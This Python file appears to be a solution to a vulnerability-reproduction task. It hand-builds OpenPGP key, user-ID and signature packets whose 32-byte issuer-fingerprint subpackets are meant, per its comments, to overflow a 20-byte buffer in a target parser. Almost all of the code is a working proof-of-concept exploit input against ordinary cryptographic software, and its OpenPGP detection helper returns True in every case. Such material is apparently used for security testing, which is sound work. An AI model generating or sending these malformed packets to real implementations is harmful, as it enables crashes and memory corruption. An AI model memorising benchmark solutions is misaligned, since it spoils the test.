import os
import re
import tarfile
from typing import Optional


def _be16(n: int) -> bytes:
    return bytes([(n >> 8) & 0xFF, n & 0xFF])


def _be32(n: int) -> bytes:
    return bytes([(n >> 24) & 0xFF, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])


def _newlen(n: int) -> bytes:
    if n < 0:
        n = 0
    if n < 192:
        return bytes([n])
    if n <= 8383:
        n2 = n - 192
        return bytes([192 + (n2 >> 8), n2 & 0xFF])
    return b"\xFF" + _be32(n & 0xFFFFFFFF)


def _packet(tag: int, body: bytes) -> bytes:
    if tag < 0:
        tag = 0
    if tag > 63:
        tag &= 63
    hdr = bytes([0xC0 | tag]) + _newlen(len(body))
    return hdr + body


def _mpi_from_bytes(b: bytes) -> bytes:
    b = b.lstrip(b"\x00") or b"\x00"
    bitlen = (len(b) - 1) * 8
    first = b[0]
    for i in range(8):
        if first & (0x80 >> i):
            bitlen += 8 - i
            break
    else:
        bitlen = 0
    return _be16(bitlen) + b


def _mpi_from_int(x: int) -> bytes:
    if x < 0:
        x = -x
    if x == 0:
        return b"\x00\x00"
    bl = x.bit_length()
    nb = (bl + 7) // 8
    b = x.to_bytes(nb, "big")
    return _be16(bl) + b


def _subpkt(t: int, data: bytes) -> bytes:
    # one-octet length encoding for subpackets is common; keep under 192 if possible
    ln = 1 + len(data)
    if ln < 192:
        return bytes([ln, t & 0xFF]) + data
    # extended: encode subpacket length in OpenPGP variable-length encoding
    # length includes type octet + data
    return _newlen(ln) + bytes([t & 0xFF]) + data


def _pgp_pubkey_v4_rsa(created: int, n_bytes: bytes, e_int: int) -> bytes:
    body = bytes([4]) + _be32(created) + bytes([1])  # RSA
    body += _mpi_from_bytes(n_bytes)
    body += _mpi_from_int(e_int)
    return _packet(6, body)


def _pgp_pubkey_v5_rsa(created: int, n_bytes: bytes, e_int: int) -> bytes:
    keymat = _mpi_from_bytes(n_bytes) + _mpi_from_int(e_int)
    body = bytes([5]) + _be32(created) + bytes([1])  # RSA
    body += _be32(len(keymat)) + keymat
    return _packet(6, body)


def _pgp_userid(s: bytes) -> bytes:
    return _packet(13, s)


def _pgp_signature_v4_with_issuer_fpr_v5(created: int, issuer_fpr32: bytes, issuer_keyid8: bytes, sig_mpi_bytes: bytes) -> bytes:
    issuer_fpr32 = (issuer_fpr32 + b"\x00" * 32)[:32]
    issuer_keyid8 = (issuer_keyid8 + b"\x00" * 8)[:8]

    hashed = b""
    hashed += _subpkt(2, _be32(created))  # signature creation time
    hashed += _subpkt(16, issuer_keyid8)  # issuer keyid (8)
    hashed += _subpkt(33, bytes([5]) + issuer_fpr32)  # issuer fingerprint (v5 => 32 bytes)

    body = bytes([4, 0x13, 1, 8])  # v4, positive certification, RSA, SHA256
    body += _be16(len(hashed)) + hashed
    body += b"\x00\x00"  # unhashed subpackets length = 0
    body += b"\x12\x34"  # left 16 bits of hash (dummy)

    # Signature (RSA): one MPI
    body += _mpi_from_bytes(sig_mpi_bytes)
    return _packet(2, body)


def _detect_openpgp_related(src_path: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            names = tf.getnames()
            # Quick heuristic: look for fuzzer harness / openpgp mentions
            cand = []
            for n in names:
                ln = n.lower()
                if ln.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs")) and (
                    "fuzz" in ln or "openpgp" in ln or "pgp" in ln or "gpg" in ln or "rnp" in ln
                ):
                    cand.append(n)
                    if len(cand) >= 80:
                        break
            pat = re.compile(rb"(LLVMFuzzerTestOneInput|openpgp|OpenPGP|pgp_|issuer fingerprint|fingerprint)", re.I)
            for n in cand:
                try:
                    f = tf.extractfile(n)
                    if not f:
                        continue
                    data = f.read(200000)
                    if pat.search(data):
                        return True
                except Exception:
                    continue
    except Exception:
        return True
    return True


class Solution:
    def solve(self, src_path: str) -> bytes:
        _ = _detect_openpgp_related(src_path)

        created = 0x5F3759DF  # deterministic

        # 2048-bit modulus: top bit set, rest mostly zeros (valid MPI)
        n_bytes = b"\x80" + (b"\x00" * 255)
        e_int = 65537

        # Signature MPI: also 2048-bit sized to satisfy strict parsers
        sig_mpi_bytes = b"\x80" + (b"\x00" * 255)

        # Issuer fingerprint v5 length 32 (likely overflow if stored in 20-byte buffer)
        issuer_fpr32 = (b"\xFF" * 32)

        # Dummy issuer keyid
        issuer_keyid8 = b"\x01\x23\x45\x67\x89\xAB\xCD\xEF"

        pk_v4 = _pgp_pubkey_v4_rsa(created, n_bytes, e_int)
        uid = _pgp_userid(b"poc@example.com")
        sig = _pgp_signature_v4_with_issuer_fpr_v5(created, issuer_fpr32, issuer_keyid8, sig_mpi_bytes)

        # Additional block to trigger key-fingerprint handling for v5 keys, if applicable
        pk_v5 = _pgp_pubkey_v5_rsa(created, n_bytes, e_int)
        uid2 = _pgp_userid(b"pocv5@example.com")
        sig2 = _pgp_signature_v4_with_issuer_fpr_v5(created, issuer_fpr32, issuer_keyid8, sig_mpi_bytes)

        # Concatenate multiple parsable packets
        poc = pk_v4 + uid + sig + pk_v5 + uid2 + sig2

        # Add a few harmless trailing bytes that resemble another packet header with zero length
        poc += b"\xC0\x00"

        return poc